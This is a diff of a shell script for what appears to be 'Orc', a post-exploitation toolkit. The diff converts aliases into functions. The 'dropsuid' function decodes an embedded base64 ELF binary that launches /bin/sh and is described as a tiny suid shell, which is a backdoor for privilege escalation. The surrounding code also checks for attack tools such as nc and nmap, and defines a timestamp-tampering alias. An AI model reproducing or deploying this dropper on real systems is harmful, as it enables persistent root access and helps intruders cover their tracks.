@@ -1446,6 +1446,30 @@ gettmp () {
 }
 
 
+
+dropsuid() {
+  # drops tiny suid shell
+  # usage: dropsuid > [file]
+  if ! orc_existsProg base64; then
+    echo 'Error: need base64, can not decode tool' >&2
+  fi
+  base64 -d << ====end
+f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA
+AAAAAIAECACABAgHAAAABwAAAAUAAAAAEAAA6AEAAADpWJCDwAxQw7sAAAAA6bgXAAAAzYDrAem7
+iIAECLgLAAAAMckx0usB6THJzYAAAC9iaW4vc2g=
+====end
+}
+
+
+tools() {
+  # Check for common tools.
+  # Arguments: none
+  # Prints report to stdout
+  type dig perl python gcc nc openssl wget strace gcore nmap gdb curl wget tcpdump
+  return 0
+  }
+
+
 gethelp() {
 echo "
 A probably non-comprehensive list of functionality in Orc v$OVERSION.
@@ -1493,10 +1517,6 @@ A probably non-comprehensive list of functionality in Orc v$OVERSION.
 cd "$HOME" || exit
 
 alias 'stomp'='touch -r'
-alias 'tools'='type dig perl python gcc nc openssl wget strace gcore nmap gdb curl wget tcpdump'
-alias 'dropsuid'='echo "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA
-AAAAAIAECACABAgHAAAABwAAAAUAAAAAEAAA6AEAAADpWJCDwAxQw7sAAAAA6bgXAAAAzYDrAem7
-iIAECLgLAAAAMckx0usB6THJzYAAAC9iaW4vc2g=" | base64 -d'
 alias 'psfull'='ps -weFH'
 alias 'listener'='netstat -peanuto'
 alias 'netgrep'='netstat -peanuto | grep'
